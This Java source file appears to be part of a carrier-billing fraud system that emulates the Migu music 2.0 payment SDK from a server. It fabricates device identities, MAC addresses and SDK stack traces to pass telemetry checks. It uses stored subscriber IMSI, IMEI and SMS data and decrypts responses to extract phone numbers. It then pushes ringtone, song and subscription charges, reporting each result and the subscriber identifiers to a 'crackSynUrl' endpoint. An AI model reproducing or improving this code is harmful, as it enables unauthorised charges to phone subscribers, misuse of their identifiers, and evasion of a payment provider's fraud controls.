package com.astrolink.dao;

import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.util.Map;

import org.apache.log4j.Logger;
import com.astrolink.consts.Const;
import com.astrolink.domain.Music2ExecLog;
import com.astrolink.logic.listener.JobThread;
import com.astrolink.service.IExecFinish;
import com.astrolink.util.music2.Common;
import com.astrolink.util.tools.Base64;
import com.astrolink.util.tools.BasicsTools;
import com.astrolink.util.tools.DbTools;
import com.astrolink.util.tools.ExceptionTools;
import com.astrolink.util.tools.GetNetWork;
import com.astrolink.util.tools.MacRandomAddress;
import com.astrolink.util.tools.Music2Tools;

import net.sf.json.JSONObject;

/**
 * 音乐2.0
 * @author sjh
 * @date 2016-09-08
 */
public class Music2ExecLinstenerThreadDao extends JobThread{
	private Logger logger = Logger.getLogger(Music2ExecLinstenerThreadDao.class);
	public StringBuffer logBuff=new StringBuffer();
	private String dbTableName;
	public Music2ExecLog music2ExecLog;
	public IExecFinish execFinish;
	public JSONObject supportAttrInfo ;
	// sdk版本相关
	public String apiVersion = "";
	public String SDKVersion = "";
	public String SEC_VERSION = "";
	public String nRQd_Lx = "";
	public String EN = "";
	public String miguEDVersion = "";
	public String soVersion = "";
	public String migusdkversion = "";
	public String MiguPay_FileSHA1 = "";

	// 设备信息相关
	public String isRoot = "1";//写死
	public String imei = "";
	public String encodecid = "";//随机
//	public String websessionid = "";
	public String Serial = "0000000000000000";//写死
	public String linux_version = "3.4.5";//配置
	public String Hardware = "";
	public String local_ip = "192.168.254.181";
	public String phoneNumber = "";
	public String imsi = "";

	public String apkstatus = "";//包月
	public int netcount = 1;//写死
	public int paycount = 0;//写死
	public String startcount = "0001";//写死
	public String startSecond = "";//写死
	public String webSecond = "";//写死

	// 动漫
//	public String PayCode = "";//计费点
	public String AppId = "";//配置
	// 咪咕
	public String Ctype = ""; //配置
	public String cpId = "";//配置
	public String contentId = "";//配置
	public String ChannelCode = "";//配置
	public String productId = "";//配置
	public String Fee = "";
	public String ItemId = "";//计费点
	private String mg20irid;//配置

	private String channelId = "";

	private String cpparam;//
	private long currentmillis;
	private String musicContentId;//配置 计费点
	private String musicCpId;//配置 计费点
	
	private String androidVersion;
	private String os;
	private String brand;
	private String model;
	private String mac;
	private String UA;
	private String payTime;
	private String definedseq;
	private String screen;
	
	private int mode;
	private String miguopen_appid;
	private String pubKey;
	private String packageName;
	private String excode;
	private String serviceId;
	private String chid;
	
	//其他参数
	private  String doChargeStatus="";
	private int payStepNum=0;
	private  String message="";
	private String transId="";
	private String en_session="";
	private String musicId = "";
	
	private  String sms;
	
	private String md5imsi;
	
	public Music2ExecLinstenerThreadDao(Music2ExecLog music2ExecLog){
		this.music2ExecLog = music2ExecLog;
	}
	
	public void setExecFinish(IExecFinish execFinish) {
		this.execFinish = execFinish;
	}
	 
	public void setDbTableName(String dbTableName) {
		this.dbTableName = dbTableName;
	}

	@Override
	public void exec() {
		logBuff.append("\n=============================================================================================================================");
		logBuff.append("\n开始音乐2.0计费确认,id为" + this.getKey()+";imsi:"+music2ExecLog.getImsi());
		try{
			supportAttrInfo = JSONObject.fromObject(music2ExecLog.getSupportAttrInfo());
			
			JSONObject mobileInfo =BasicsTools.randomMobileInfo(1).getJSONObject(0);
			androidVersion = mobileInfo.getString("system");
			os = androidVersion.substring(8,androidVersion.length());
			brand = mobileInfo.getString("name");
			model = mobileInfo.getString("type");
			mac = MacRandomAddress.getMacAddrWithFormat(":");
			UA=mobileInfo.getString("UA");
			payTime = Music2Tools.getLogTimeStamp();
			definedseq = music2ExecLog.getCpparam();
			screen = mobileInfo.getString("x")+"*"+mobileInfo.getString("y");
			
			mode = supportAttrInfo.optInt("mode");
			miguopen_appid=supportAttrInfo.optString("miguopen_appid");
			pubKey = supportAttrInfo.optString("pubKey");
			packageName = supportAttrInfo.optString("packageName");
			excode = supportAttrInfo.optString("excode");
			serviceId = supportAttrInfo.optString("serviceId");
			imei = music2ExecLog.getImei();
			imsi = music2ExecLog.getImsi();
			chid = supportAttrInfo.optString("channelId");
			
			apiVersion = supportAttrInfo.optString("apiVersion");
			SDKVersion = supportAttrInfo.optString("SDKVersion");
			SEC_VERSION = supportAttrInfo.optString("SEC_VERSION");
			nRQd_Lx = supportAttrInfo.optString("nRQd_Lx");
			EN = supportAttrInfo.optString("EN");
			miguEDVersion = supportAttrInfo.optString("miguEDVersion");
			soVersion = supportAttrInfo.optString("soVersion");
			migusdkversion = supportAttrInfo.optString("migusdkversion");
			MiguPay_FileSHA1 = supportAttrInfo.optString("MiguPay_FileSHA1");
			
			mg20irid=supportAttrInfo.optString("mg20irid");
			AppId=supportAttrInfo.optString("AppId");
			cpId=supportAttrInfo.optString("cpId");
			contentId=supportAttrInfo.optString("contentId");
			ChannelCode=supportAttrInfo.optString("ChannelCode");
			productId=supportAttrInfo.optString("productId");
			musicContentId=supportAttrInfo.optString("musicContentId");
			musicCpId=supportAttrInfo.optString("musicCpId");
			phoneNumber = supportAttrInfo.optString("mobile");
			encodecid=supportAttrInfo.optString("encodeCID");
			Hardware=brand+model;
			
			apkstatus=supportAttrInfo.optString("apkstatus");
			cpparam = music2ExecLog.getCpparam();
			Fee=supportAttrInfo.optString("consumePrice");
			ItemId=supportAttrInfo.optString("itemId");
			Ctype=supportAttrInfo.optString("Ctype");
			sms = supportAttrInfo.optString("sms");
			sms = new String(Base64.decode(sms));
			
			md5imsi = Music2Tools.md52String32(music2ExecLog.getImsi().getBytes());

			// String timeStamp = System.currentTimeMillis() / 1000 + "";
			// timeStamp = "1449557499";
			// System.out.println(timeStamp);
			// generateMuisicLoginSms(md5imsi, miguopen_appid, DeviceId, timeStamp,
			// excode);
			//
			
			payStepNum++;
			String checksmsinitreturn_rsp = Music2Tools.post_checksmsinitreturn_req(md5imsi,
					supportAttrInfo.optString("miguopen_appid"),supportAttrInfo.optString("pubKey"),supportAttrInfo.optString("packageName"),supportAttrInfo.optString("excode"), UA);
			doChargeStatus = Music2Tools.getContextByTag(checksmsinitreturn_rsp,"return_code");

			if (!doChargeStatus.equals("0"))
				return;

			if (mode == 0) {// 包月
				payStepNum++;
				String query_rsp = Music2Tools.post_query_req(md5imsi, miguopen_appid, pubKey,
						packageName, excode, definedseq, UA, serviceId, imei,
						imsi, os, brand, model, mac, payTime,chid);
				logBuff.append("\nquery_rsp:"+query_rsp);
				doChargeStatus = Music2Tools.getContextByTag(query_rsp, "resCode");
				
				phoneNumber=Music2Tools.getContextByTag(query_rsp, "mobile");
				if(phoneNumber!=null && !phoneNumber.equals("")){
					phoneNumber=phoneNumber.replace("*", "0");
				}
				if (!doChargeStatus.equals("300002"))
					return;
				
				String serviceEx_rsp = Music2Tools.post_serviceEx_req(md5imsi, miguopen_appid,
						pubKey, packageName, excode, definedseq, UA, serviceId,chid
						,imei,imsi,os,brand,model,mac,payTime,serviceId);
				logBuff.append("\nserviceEx_rsp:"+serviceEx_rsp);
				
				payStepNum++;
				String cp_open= Music2Tools.post_cp_open(md5imsi, miguopen_appid, pubKey, packageName, excode, definedseq,
						UA, serviceId, imei, imsi, os, brand, model, mac,
						payTime,chid,logBuff);


				doChargeStatus=Music2Tools.getContextByTag(cp_open, "resCode");
				if(doChargeStatus.equals("000000"))doChargeStatus="0";
				logBuff.append(",final_doChargeStatus:"+doChargeStatus);
				return;
			}else if(mode==4){
				payStepNum++;
				String result = run1();//
				String bizCode = Music2Tools.getContextByTag(result, "bizCode");
				String biztype = Music2Tools.getContextByTag(result, "bizType");
				String codeRate = "0"; // 0-标清版（40kbps） 1-高清版（128kbps） 2-杜比高清版
										// // 下载全曲有 0 1 2 //下载振铃只有 0 1
				// payTime = base.getLogTimeStamp();
				// definedseq = "FCS16090521267110";
//				logBuff.append("\nresult:"+result);
				phoneNumber=Music2Tools.getContextByTag(result, "mobile");
//				logBuff.append("\nphoneNumber:"+phoneNumber);
				if(phoneNumber!=null && !phoneNumber.equals("")){
					phoneNumber=phoneNumber.replace("*", "0");
				}
//				logBuff.append("\nphoneNumber:"+phoneNumber);
				payStepNum++;
				String cp_open = Music2Tools.post_cp_open(md5imsi, miguopen_appid, pubKey, packageName, excode,
						definedseq, UA, serviceId, imei, imsi, os, brand,
						model, mac, payTime, bizCode, biztype, codeRate,chid,logBuff);

				doChargeStatus=Music2Tools.getContextByTag(cp_open, "resCode");
				if(doChargeStatus.equals("000000")){
					doChargeStatus="0";
					String downUrl=Music2Tools.getContextByTag(cp_open, "downUrl");
					logBuff.append("\ndownUrl:"+downUrl);
					Music2Tools.downloadByURL(downUrl, logBuff);
				}
				logBuff.append(",final_doChargeStatus:"+doChargeStatus);
			}else{
				payStepNum++;
				//以下是点播流程
				String rand16Num = Common.getSession(16);
				String sSdkSessionid = Common.getSession(16);
				String localsessionid = Common.getSession(12);

//				String RELEASE = androidVersion;
				
//				String BRAND = mobileInfo.getString("name");
//				String MODEL = mobileInfo.getString("type");
//				String MacAddr = mac;
				String Location = "";
				String NetworkType = "0";

//				long startmillis = System.currentTimeMillis();
				long startmillis=supportAttrInfo.optLong("startmillis");
				Map<String, String> headers = Music2Tools.initHeaders(apiVersion, SDKVersion,
						SEC_VERSION, nRQd_Lx, EN, imsi, imei);
				String verification_checkSdkUpdate = Music2Tools.post_verification_checkSdkUpdate(headers, SDKVersion,
								miguEDVersion, soVersion);

				String BaseClientHeader = Music2Tools.generate_BaseClientHeader(sSdkSessionid,
						"0", imei, imsi, androidVersion, screen, brand, model, SDKVersion,
						apiVersion, mac, Location, local_ip, NetworkType);
				System.out.println(BaseClientHeader);

				local_ip = Music2Tools.formateLocalip(local_ip);

//				currentmillis = startmillis + Music2Tools.getRandom(5000);
				currentmillis=supportAttrInfo.optLong("reportStrCurrentmillis");
				long webmillis = currentmillis;
				startSecond = (currentmillis - startmillis) / 1000 + "";
				webSecond = (currentmillis - webmillis) / 1000 + "";

				String ReportStr = Music2Tools.generate_ReportStr("", imei, imsi, encodecid,
						"", Music2Tools.getSmsTimeStampByMillis(currentmillis), apkstatus,
						netcount, paycount, startcount, startSecond, webSecond,
						soVersion, migusdkversion, "", "", "", "", "",
						MiguPay_FileSHA1, Serial, linux_version, Hardware, local_ip,
						"com.migu.sdk.main.MiguMainSDK$1.run(MiguMainSDK.java:105)|2",
						isRoot, localsessionid);
				netcount++;
				System.out.println("ReportStr:\t" + ReportStr);

				String tl_initcttl_rsp = Music2Tools.post_tl_initcttl(headers,
						BaseClientHeader, mg20irid, ReportStr,
						Music2Tools.getLogTimeStampByMillis(currentmillis));
				if (!Music2Tools.getContextByTag(tl_initcttl_rsp, "ResultCode").equals("0")) {
					System.out.println("tl_initcttl failed!");
					return;
				}
				String tl_initcttl_enc = Music2Tools.getContextByTag(tl_initcttl_rsp, "Enc");

				String[] tl_initcttl_enc_dec = Music2Tools.DecryptNet1(mg20irid,
						tl_initcttl_enc);
				if (tl_initcttl_enc_dec == null) {
					return;
				}

//				currentmillis = currentmillis + 1000 + Music2Tools.getRandom(1000);
				currentmillis=supportAttrInfo.optLong("smscurrentmillis");

//				String sms = Music2Tools.generate_migu_sms(mg20irid, imsi, imei, encodecid,
//						rand16Num, Music2Tools.getSmsTimeStampByMillis(currentmillis),
//						miguApkstatus);
				if (sms.equals("")) {
					return;
				}
				// Thread.sleep(6*1000);
//				currentmillis = currentmillis + 10000 + Music2Tools.getRandom(10000);
				currentmillis=supportAttrInfo.optLong("reReportStrCurrentmillis");
				String charge_getSession_rsp = "";
				for (int i = 0; i < 3; i++) {
					webSecond = (currentmillis - webmillis) / 1000 + "";
					startSecond = (Integer.parseInt(startSecond) + Integer
							.parseInt(webSecond)) + "";
					webmillis = currentmillis;
					ReportStr = Music2Tools.generate_ReportStr(
									"",
									imei,
									imsi,
									encodecid,
									"",
									Music2Tools.getSmsTimeStampByMillis(currentmillis),
									apkstatus,
									netcount,
									paycount,
									startcount,
									startSecond,
									webSecond,
									soVersion,
									migusdkversion,
									"",
									"",
									"",
									"",
									"",
									MiguPay_FileSHA1,
									Serial,
									linux_version,
									Hardware,
									local_ip,
									"com.migu.sdk.inter.impl.SMSGetPhoneImpl$2.run(SMSGetPhoneImpl.java:72)|2",
									isRoot, localsessionid);
					netcount++;
					System.out.println("ReportStr:\t" + ReportStr);
					charge_getSession_rsp = Music2Tools.post_charge_getSession(headers,
							mg20irid, sms, ReportStr);
					doChargeStatus = Music2Tools.getContextByTag(charge_getSession_rsp, "ResultCode");
					if (doChargeStatus.equals("0")) {
						break;
					} else {
						if (i == 2) {
							return;
						}
						currentmillis = currentmillis + 1000 + Music2Tools.getRandom(2000);
						try {
							Thread.sleep(3 * 1000);
						} catch (InterruptedException e) {
							e.printStackTrace();
						}
					}
				}
				
				String[] charge_getSession_rsp_dec = Music2Tools.DecryptNet1(mg20irid,
						Music2Tools.getContextByTag(charge_getSession_rsp, "Enc"));
				if (charge_getSession_rsp_dec == null
						|| !charge_getSession_rsp_dec[0].substring(1, 2).equals("0")) {
					return;
				}
				phoneNumber = charge_getSession_rsp_dec[0].substring(3, 14);

				System.out.println("phoneNumber:\t" + phoneNumber);
				payStepNum++;
				for (int i = 0; i < 3; i++) {
					doChargeStatus = billing(localsessionid, startmillis, headers, BaseClientHeader,webmillis);
					if(doChargeStatus.equals("0")) break;
				}
				logBuff.append(",final_doChargeStatus:"+doChargeStatus);
				if (!doChargeStatus.equals("0")){
					logBuff.append(",计费失败");
				}
			}
		} catch (Exception e) {
			logBuff.append(ExceptionTools.exception(e));
		}finally{
			try {
				if(payStepNum<3 && doChargeStatus.equals("0")){
					doChargeStatus="-1";
				}
				
				if (doChargeStatus.equals("0")){
					deleteExecLog(music2ExecLog.getId(),logBuff);
					savePayResultLog(payStepNum,doChargeStatus,message,phoneNumber,transId,music2ExecLog.getCrackSynUrl(),en_session,music2ExecLog.getId(),logBuff);
				}else{
					if(music2ExecLog.getExecNum()<Const.MUSIC_LOGIC_RETRY_NUM-1){
						updateExecNum(music2ExecLog.getId(),logBuff);
					}else{
						deleteExecLog(music2ExecLog.getId(),logBuff);
						savePayResultLog(payStepNum,doChargeStatus,message,phoneNumber,transId,music2ExecLog.getCrackSynUrl(),en_session,music2ExecLog.getId(),logBuff);
					}
				}
			} catch (Exception e) {
				logBuff.append(",处理请求失败，id为" + this.getKey() + ExceptionTools.exception(e));
			} finally{
				if (execFinish != null) {
					execFinish.execDone(this.getKey());
					logBuff.append(",处理请求结束，id为" + this.getKey());
				}
				logger.info(logBuff.toString());
			}
		}
	}
	
	public String run1(){
		String cpparam = "";
		if (mode == 1) {// 彩铃-订购彩铃
			musicId = serviceId;
			String post_crbt_info_rsp = Music2Tools.post_crbt_info(md5imsi, miguopen_appid,
					pubKey, packageName, excode, definedseq, UA, musicId);
			String resCode = Music2Tools.getContextByTag(post_crbt_info_rsp, "resCode");
			if (!resCode.equals("000000"))
				return "";
			cpparam = Music2Tools.getContextByTag(post_crbt_info_rsp, "hold2");
		} else if (mode == 6) {
			String post_ring_policy_rsp = Music2Tools.post_album_orderCount(md5imsi,
					miguopen_appid, pubKey, packageName, excode, definedseq,
					UA, musicId,chid,imei,imsi,os,brand,model,mac,payTime);
			String resCode = Music2Tools.getContextByTag(post_ring_policy_rsp, "resCode");
			if (!resCode.equals("000000"))
				return "";
			cpparam = Music2Tools.getContextByTag(post_ring_policy_rsp, "hold2");
		} else {
			// 获取排行榜
//			String listContent = Music2Tools.post_search_music_listbychart(md5imsi,
//					miguopen_appid, pubKey, packageName, excode, definedseq,
//					UA, "100000001",chid,imei,imsi,os,brand,model,mac,payTime);
			musicId = serviceId;
			if (mode == 2) {// 歌曲-订购彩铃
				String post_crbt_info_rsp = Music2Tools.post_crbt_info(md5imsi,
						miguopen_appid, pubKey, packageName, excode,
						definedseq, UA, musicId);
				String resCode = Music2Tools.getContextByTag(post_crbt_info_rsp, "resCode");
				if (!resCode.equals("000000"))
					return "";
				cpparam = Music2Tools.getContextByTag(post_crbt_info_rsp, "hold2");
			} else if (mode == 3) {// 歌曲-下载全曲
				String post_song_policy_rsp = Music2Tools.post_song_policy(md5imsi,
						miguopen_appid, pubKey, packageName, excode,
						definedseq, UA, musicId);
				String resCode = Music2Tools.getContextByTag(post_song_policy_rsp,
						"resCode");
				if (!resCode.equals("000000"))
					return "";
				cpparam = Music2Tools.getContextByTag(post_song_policy_rsp, "hold2");

			} else if (mode == 4) {// 歌曲-下载振铃
				String post_ring_policy_rsp = Music2Tools.post_ring_policy(md5imsi,
						miguopen_appid, pubKey, packageName, excode,
						definedseq, UA, musicId,chid,imei,imsi
						,os,brand,model,mac,payTime);
				String resCode = Music2Tools.getContextByTag(post_ring_policy_rsp,
						"resCode");
				if (!resCode.equals("000000"))
					return "";
				cpparam = post_ring_policy_rsp;//Music2Tools.getContextByTag(post_ring_policy_rsp, "hold2");
			}
		}
		
		return cpparam;
	}
	
	public  void updateExecNum(long id,StringBuffer logBuff){
		StringBuffer sqlBuff=new StringBuffer();
		sqlBuff.append("UPDATE ").append("spinfo.support_exec_log").append(" SET execNum = execNum+1, updateDate='").append(BasicsTools.getForDate("yyyy-MM-dd HH:mm:ss")).append("'  WHERE `id` = '").append(id).append("' ");
		DbTools dt=new  DbTools(Const.DB_SPINFO_URL,Const.DB_MYSQL_DRIVER,Const.DB_SPINFO_USERNAME,Const.DB_SPINFO_PASSWORD);
		logBuff.append(",updateExecNum：" + dt.upDate(sqlBuff.toString(), Music2ExecLinstenerThreadDao.class));
	}
	
	public  void deleteExecLog(long id,StringBuffer logBuff){
		StringBuffer sqlBuff=new StringBuffer();
		sqlBuff.append("DELETE FROM ").append("spinfo.support_exec_log").append(" WHERE `id` = '").append(id).append("' ");
		DbTools dt=new  DbTools(Const.DB_SPINFO_URL,Const.DB_MYSQL_DRIVER,Const.DB_SPINFO_USERNAME,Const.DB_SPINFO_PASSWORD);
		logBuff.append(",deleteExecLog：" + dt.upDate(sqlBuff.toString(), Music2ExecLinstenerThreadDao.class));
	}
	
	public void savePayResultLog(int payStepNum,String status,String message,String phoneNumber,String transId,String crackSynUrl,String en_session,long execLogId,StringBuffer logBuff){
		JSONObject dataInfo = new JSONObject();
		dataInfo.put("execLogId", execLogId);
		if(status==null || status.equals("")){
			status="-1";
		}
		dataInfo.put("status", status);
		dataInfo.put("message", message);//???
		dataInfo.put("imei", music2ExecLog.getImei());
		dataInfo.put("imsi", music2ExecLog.getImsi());
		dataInfo.put("monum", supportAttrInfo.optString("monum"));
		dataInfo.put("consumeCode", supportAttrInfo.optString("consumeCode"));
		dataInfo.put("cpparam", supportAttrInfo.optString("cpparam"));
		dataInfo.put("execNum", music2ExecLog.getExecNum());
		if(phoneNumber==null || phoneNumber.equals("")){
			phoneNumber="0";
		}
		dataInfo.put("phoneNumber", phoneNumber);
		dataInfo.put("cpInfoId", music2ExecLog.getCpInfoId());
		dataInfo.put("transId", supportAttrInfo.optString("rand16Num")+supportAttrInfo.optString("timeStamp"));
		dataInfo.put("dayTime", BasicsTools.getForDate("yyyy-MM-dd"));
		dataInfo.put("inputDate", BasicsTools.getForDate("yyyy-MM-dd HH:mm:ss"));
		dataInfo.put("methodType", supportAttrInfo.optString("methodType"));
		dataInfo.put("channelId", 0);

		dataInfo.put("infoCode", 0);
		dataInfo.put("ssid", supportAttrInfo.optString("ssid"));
		if (supportAttrInfo.optString("proxyIp").equals("")) {
			dataInfo.put("proxyIp", "");
		} else {
			dataInfo.put("proxyIp", supportAttrInfo.optString("proxyIp"));
		}

		try {
			crackSyn(dataInfo, crackSynUrl(dataInfo,crackSynUrl,logBuff),logBuff);
		} catch (Exception e) {
			logger.error(ExceptionTools.exception(e));
		}

		DbTools dt = new DbTools(Const.DB_SPINFO_URL, Const.DB_MYSQL_DRIVER, Const.DB_SPINFO_USERNAME, Const.DB_SPINFO_PASSWORD);
		logger.info("sevePayResultLog：" + dt.insertJson("support_pay_result", dataInfo, Music2ExecLinstenerThreadDao.class));
	}
	
	public void crackSyn(JSONObject dataInfo,String url,StringBuffer logBuff){
		GetNetWork get=new GetNetWork(url);
		get.executeMethod();
		dataInfo.put("synUrl", url);
		dataInfo.put("synstatus", get.getNetState());
		dataInfo.put("synresult", get.getString().replaceAll("'",""));
		logBuff.append(dataInfo.toString());
	}
	
	public String crackSynUrl(JSONObject dataInfo,String crackSynUrl,StringBuffer logBuff){
		StringBuffer sbuff =new StringBuffer();
		sbuff.append(crackSynUrl);
		sbuff.append("?").append("mobile=").append(dataInfo.optString("phoneNumber"));
		sbuff.append("&").append("cpid=").append(dataInfo.optString("cpInfoId"));
		sbuff.append("&").append("cpparam=").append(dataInfo.optString("cpparam"));
		sbuff.append("&").append("monum=").append(dataInfo.optString("monum"));
		sbuff.append("&").append("sid=").append(dataInfo.optString("consumeCode"));
		sbuff.append("&").append("imei=").append(dataInfo.optString("imei"));
		sbuff.append("&").append("imsi=").append(dataInfo.optString("imsi"));
		sbuff.append("&").append("linkId=").append(dataInfo.optString("transId"));
		sbuff.append("&").append("status=").append(dataInfo.optString("status"));
		sbuff.append("&").append("chid=").append(dataInfo.optString("channelId"));
		sbuff.append("&").append("spProductConsumeCodeId=").append(dataInfo.optString("ssid"));
		try {
			sbuff.append("&").append("message=").append(URLEncoder.encode(dataInfo.optString("message"),"utf-8"));
		} catch (UnsupportedEncodingException e) {
			logBuff.append(",crackSynUrl:"+ExceptionTools.exception(e));
		}
		return sbuff.toString();
	}
	
	private String billing(String localsessionid, long startmillis,
			Map<String, String> headers, String BaseClientHeader, long webmillis) {
		String ReportStr;
		String resultCode="";
		currentmillis = currentmillis + 500 + Music2Tools.getRandom(1000);
		webSecond = (currentmillis - webmillis) / 1000 + "";
		startSecond = (Integer.parseInt(startSecond) + Integer
				.parseInt(webSecond)) + "";
		webmillis = currentmillis;
		ReportStr = Music2Tools.generate_ReportStr(phoneNumber, imei, imsi, encodecid,
				"", Music2Tools.getSmsTimeStampByMillis(currentmillis), apkstatus,
				netcount, paycount, startcount, startSecond, webSecond,
				soVersion, migusdkversion, "0", "", "", "", "",
				MiguPay_FileSHA1, Serial, linux_version, Hardware, local_ip,
				"com.migu.sdk.main.MiguMainSDK$3.run(MiguMainSDK.java:198)|2",
				isRoot, localsessionid);
		netcount++;
		System.out.println("ReportStr:\t" + ReportStr);

		String OrderId = Music2Tools.getOrderId(currentmillis);
		String policySecLv_queryChargePolicyInfoReq = Music2Tools
				.generate_policySecLv_queryChargePolicyInfoReq(
						BaseClientHeader, phoneNumber,
						Music2Tools.getLogTimeStampByMillis(currentmillis), Ctype,
						OrderId, Fee, "", cpId, contentId, ChannelCode,
						productId);
		String policySecLv_queryChargePolicyInfoReq_rsp = Music2Tools.post_policySecLv_queryChargePolicyInfoReq(headers, mg20irid,
						policySecLv_queryChargePolicyInfoReq, ReportStr);
		resultCode = Music2Tools.getContextByTag(policySecLv_queryChargePolicyInfoReq_rsp,
				"ResultCode");
		if (!resultCode.equals("0")) {
			return resultCode;
		}

		String[] policySecLv_queryChargePolicyInfoReq_rsp_dec = Music2Tools
				.DecryptNet1(mg20irid, Music2Tools.getContextByTag(
						policySecLv_queryChargePolicyInfoReq_rsp, "Enc"));
		
		resultCode=Music2Tools.getContextByTag(
				policySecLv_queryChargePolicyInfoReq_rsp_dec[1],
				"ResultCode");
		if (policySecLv_queryChargePolicyInfoReq_rsp_dec == null
				|| !resultCode.equals("0")) {
			return resultCode;
		}
		String ChargePolicy = Music2Tools
				.getContextByTag(
						policySecLv_queryChargePolicyInfoReq_rsp_dec[1],
						"ChargePolicy");
		String ChannelFlag = Music2Tools.getContextByTag(
				policySecLv_queryChargePolicyInfoReq_rsp_dec[1], "ChannelFlag");
		String RedUserFlag = Music2Tools.getContextByTag(
				policySecLv_queryChargePolicyInfoReq_rsp_dec[1], "RedUserFlag");
		// 点击计费
		currentmillis = currentmillis + 2000 + Music2Tools.getRandom(10000);
		webSecond = (currentmillis - webmillis) / 1000 + "";
		startSecond = (Integer.parseInt(startSecond) + Integer
				.parseInt(webSecond)) + "";
		webmillis = currentmillis;
		ReportStr = Music2Tools.generate_ReportStr(phoneNumber, imei, imsi, encodecid,
				"", Music2Tools.getSmsTimeStampByMillis(currentmillis), apkstatus,
				netcount, paycount, startcount, startSecond, webSecond,
				soVersion, migusdkversion, "", "", "", "", "",
				MiguPay_FileSHA1, Serial, linux_version, Hardware, local_ip,
				"com.migu.sdk.ui.PayView$3.onClick(PayView.java:282)|2",
				isRoot, localsessionid);
		netcount++;
		System.out.println("ReportStr:\t" + ReportStr);
		cpparam = run1();
//		cpparam = "bf2bc532befc2bfc624a59271bf2b2cd8f6ac768de5acebc829c0b3ad1b454f1668342f7d7c6cbcb8bf7fe905992f106c4348a287f6bacb1f42c1cbe48197eb4d96d8b14028269ab8400ce777e87861a4e047a5f1c00f42a3653642f8b60c65451ec52640e6730ba";
		String charge_sessionReq_req = Music2Tools.generate_charge_sessionReq(
				ChargePolicy, phoneNumber,
				Music2Tools.getLogTimeStampByMillis(currentmillis), Ctype, OrderId,
				Fee, ItemId, cpId, contentId, ChannelCode, productId, cpparam);
		String charge_sessionReq_rsp = Music2Tools.post_charge_sessionReq(headers,
				mg20irid, charge_sessionReq_req, ReportStr);
		resultCode = Music2Tools.getContextByTag(charge_sessionReq_rsp, "ResultCode");
		if (!resultCode.equals(
				"0")) {
			return resultCode;
		}
		String ihJVd = Music2Tools.getContextByTag(charge_sessionReq_rsp, "ihJVd");
		String Lwkn = Music2Tools.getContextByTag(charge_sessionReq_rsp, "Lwkn");
		String[] charge_sessionReq_rsp_dec = Music2Tools.DecryptNet1(mg20irid,
				Music2Tools.getContextByTag(charge_sessionReq_rsp, "Enc"));
		if (charge_sessionReq_rsp_dec == null) {
			return "";
		}
		System.out.println("charge_sessionReq_rsp_dec:\t"
				+ charge_sessionReq_rsp_dec[0]);
		String websessionid = charge_sessionReq_rsp_dec[0].substring(1, 9);
		System.out.println("websessionid:\t" + websessionid);
		currentmillis = currentmillis + 500 + Music2Tools.getRandom(1000);
		webSecond = (currentmillis - webmillis) / 1000 + "";
		startSecond = (Integer.parseInt(startSecond) + Integer
				.parseInt(webSecond)) + "";
		webmillis = currentmillis;
		paycount++;
		if (paycount == 1) {
			apkstatus = Music2Tools.chargeApkstatus(apkstatus);
		}
		String ChargePolicyStatus = "status=0,get=" + ChargePolicy + ",use="
				+ ChargePolicy;
		String payInfo = musicCpId + "," + ChannelCode + ",," + musicContentId
				+ ";" + cpId + "," + ChannelCode + "," + productId + ","
				+ contentId;
		ReportStr = Music2Tools.generate_ReportStr(phoneNumber, imei, imsi, encodecid,
				websessionid, Music2Tools.getSmsTimeStampByMillis(currentmillis),
				apkstatus, netcount, paycount, startcount, startSecond,
				webSecond, soVersion, migusdkversion, "0", ChargePolicyStatus,
				payInfo, "", "", MiguPay_FileSHA1, Serial, linux_version,
				Hardware, local_ip,
				"com.openx.greq.request.Client$3.run(Client.java:127)|2",
				isRoot, localsessionid);
		netcount++;
		System.out.println("ReportStr:\t" + ReportStr);
		headers.put("kyMy", ihJVd);
		headers.put("ssov", miguEDVersion);
		String charge_payReq_req = Music2Tools.generate_charge_payReq(
				BaseClientHeader, ChargePolicy, phoneNumber, ChannelFlag,
				Music2Tools.getLogTimeStampByMillis(currentmillis), Ctype, OrderId,
				Fee, ItemId, cpId, contentId, ChannelCode, productId, cpparam);
		String edstr = Music2Tools.generate_charge_payReq_EDstr(
				miguEDVersion.substring(miguEDVersion.indexOf(".") + 1),
				Music2Tools.getSmsTimeStampByMillis(currentmillis
						- (8 * 60 * 60 * 1000)), imei, paycount);
		String charge_payReq_rsp = Music2Tools.post_charge_payReq(headers, mg20irid,
				charge_payReq_req, ReportStr, ihJVd, Lwkn, edstr);
		resultCode = Music2Tools.getContextByTag(charge_payReq_rsp, "ResultCode");
		if (!resultCode.equals("0")) {
			return resultCode;
		}
		String[] charge_payReq_rsp_dec = Music2Tools.DecryptNet1(mg20irid,
				Music2Tools.getContextByTag(charge_payReq_rsp, "Enc"));
		resultCode = Music2Tools.getContextByTag(charge_payReq_rsp_dec[1], "ResultCode");
		if (charge_payReq_rsp_dec == null
				|| !resultCode.equals("0")) {
			return resultCode;
		}
		headers.remove("kyMy");
		headers.remove("ssov");
		System.out.println(charge_payReq_rsp_dec[1]);
		
		if(mode==6){
			String resCode = Music2Tools.billingSuccess(md5imsi,
					miguopen_appid, pubKey, packageName, excode, definedseq,
					UA, musicId,chid,imei,imsi,os,brand,model,mac,payTime);
			if (!"000000".equals(resCode)) {
				return resCode;
			}
		}
		return resultCode;
	}
}
